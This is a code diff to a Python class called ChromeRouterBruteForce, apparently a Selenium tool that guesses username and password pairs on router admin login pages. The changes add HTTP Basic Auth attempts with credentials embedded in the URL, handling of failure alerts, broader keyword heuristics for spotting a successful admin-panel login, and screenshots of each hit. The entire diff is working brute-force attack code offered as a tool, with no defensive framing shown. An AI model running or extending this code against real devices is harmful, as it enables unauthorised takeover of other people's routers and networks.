@@ -375,14 +375,15 @@ class ChromeRouterBruteForce:
                 'settings', 'system', 'status', 'network', 'router', 'gateway', 'modem',
                 'wan', 'lan', 'wireless', 'firewall', 'nat', 'dhcp', 'dns', 'qos',
                 'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart',
-                'main menu', 'welcome', 'logout', 'log out'
+                'main menu', 'welcome', 'logout', 'log out', 'management', 'monitor',
+                'device', 'interface', 'port', 'service', 'security', 'advanced'
             ]
             
             # Check for login page indicators (negative)
             login_indicators = [
                 'username', 'password', 'login', 'sign in', 'authentication', 'enter credentials',
                 'user login', 'admin login', 'router login', 'invalid', 'incorrect', 'failed',
-                'error', 'denied', 'wrong', 'access denied'
+                'error', 'denied', 'wrong', 'access denied', 'please login', 'enter username'
             ]
             
             admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
@@ -390,6 +391,17 @@ class ChromeRouterBruteForce:
             
             # Check if URL changed from login page
             url_changed = not any(login_term in current_url for login_term in ['login', 'signin', 'sign-in', 'auth', 'authentication'])
+            
+            # Check for specific success indicators
+            success_indicators = [
+                'logout', 'log out', 'welcome', 'dashboard', 'main menu', 'system status',
+                'device status', 'network status', 'router status', 'admin panel'
+            ]
+            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
+            
+            # Strong success criteria: URL changed AND has success indicators
+            if url_changed and success_count >= 1:
+                return True, f"URL changed and success indicators found: {success_count}"
             
             # Success criteria: more admin indicators than login indicators, and URL changed
             if admin_count > login_count and admin_count >= 2 and url_changed:
@@ -399,7 +411,7 @@ class ChromeRouterBruteForce:
             if admin_count >= 3 and login_count <= 1:
                 return True, f"Strong admin content detected: {admin_count} indicators"
             
-            return False, f"Admin indicators: {admin_count}, Login indicators: {login_count}"
+            return False, f"Admin indicators: {admin_count}, Login indicators: {login_count}, Success indicators: {success_count}"
             
         except Exception as e:
             print(f"{Colors.YELLOW}[!] Error checking login success: {e}{Colors.END}")
@@ -420,14 +432,58 @@ class ChromeRouterBruteForce:
             print(f"{Colors.RED}[!] Failed to take screenshot: {e}{Colors.END}")
             return None
     
+    def handle_alert(self):
+        """Handle browser alerts (login failure messages)"""
+        try:
+            alert = self.driver.switch_to.alert
+            alert_text = alert.text
+            alert.accept()  # Click OK to dismiss alert
+            return alert_text
+        except:
+            return None
+    
+    def test_http_basic_auth(self, username, password, login_url):
+        """Test HTTP Basic Authentication"""
+        try:
+            parsed_url = urlparse(login_url)
+            auth_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{parsed_url.path}"
+            
+            print(f"{Colors.BLUE}[*] Testing HTTP Basic Auth: {username}:{password}{Colors.END}")
+            self.driver.get(auth_url)
+            time.sleep(3)
+            
+            current_url = self.driver.current_url
+            page_source = self.driver.page_source.lower()
+            
+            # Check if we successfully bypassed auth
+            if "data:," not in current_url and current_url != "about:blank":
+                # Check for admin panel indicators
+                admin_indicators = ['admin', 'dashboard', 'control panel', 'configuration', 'settings', 'system', 'status', 'network', 'router', 'gateway']
+                admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
+                
+                if admin_count >= 2:
+                    print(f"{Colors.GREEN}[+] HTTP Basic Auth successful! {username}:{password}{Colors.END}")
+                    screenshot_path = self.take_screenshot(f"success_basic_auth_{username}_{password}")
+                    return True, screenshot_path
+            
+            return False, "HTTP Basic Auth failed"
+            
+        except Exception as e:
+            return False, f"HTTP Basic Auth error: {e}"
+    
     def test_credentials(self, username, password, login_url):
         """Test a single set of credentials"""
         try:
             print(f"{Colors.CYAN}[>] Testing credentials: {username}:{password}{Colors.END}")
             
-            # Navigate to login page
+            # First, try HTTP Basic Authentication
+            basic_auth_success, basic_auth_result = self.test_http_basic_auth(username, password, login_url)
+            if basic_auth_success:
+                return True, basic_auth_result
+            
+            # Navigate to login page for form-based authentication
             self.driver.get(login_url)
-            time.sleep(2)
+            time.sleep(3)  # Wait for page to load completely
             
             # Take initial screenshot
             self.take_screenshot(f"initial_page_{username}_{password}")
@@ -440,29 +496,45 @@ class ChromeRouterBruteForce:
                 return False, "Form fields not found"
             
             # Clear and fill fields
-            username_field.clear()
-            password_field.clear()
-            username_field.send_keys(username)
-            password_field.send_keys(password)
+            try:
+                username_field.clear()
+                password_field.clear()
+                username_field.send_keys(username)
+                password_field.send_keys(password)
+            except Exception as e:
+                print(f"{Colors.YELLOW}[!] Could not fill form fields: {e}{Colors.END}")
+                return False, f"Form filling error: {e}"
             
             # Find and click submit button
             submit_button = self.find_submit_button()
             if submit_button:
-                submit_button.click()
+                try:
+                    submit_button.click()
+                except:
+                    # Try pressing Enter on password field
+                    password_field.send_keys("\n")
             else:
                 # Try pressing Enter on password field
                 password_field.send_keys("\n")
             
-            # Wait for page to load
+            # Wait for page to load and handle any alerts
             time.sleep(3)
+            
+            # Check for alerts (login failure messages)
+            alert_text = self.handle_alert()
+            if alert_text:
+                print(f"{Colors.YELLOW}[-] Login failed: {alert_text}{Colors.END}")
+                # Take screenshot of failed login with alert
+                self.take_screenshot(f"failed_alert_{username}_{password}")
+                return False, f"Alert: {alert_text}"
             
             # Check if login was successful
             success, reason = self.is_login_successful()
             
             if success:
                 print(f"{Colors.GREEN}[+] Login successful! {reason}{Colors.END}")
-                # Take screenshot of successful login
-                screenshot_path = self.take_screenshot(f"success_{username}_{password}")
+                # Take screenshot of successful login (admin panel)
+                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
                 return True, screenshot_path
             else:
                 print(f"{Colors.YELLOW}[-] Login failed: {reason}{Colors.END}")
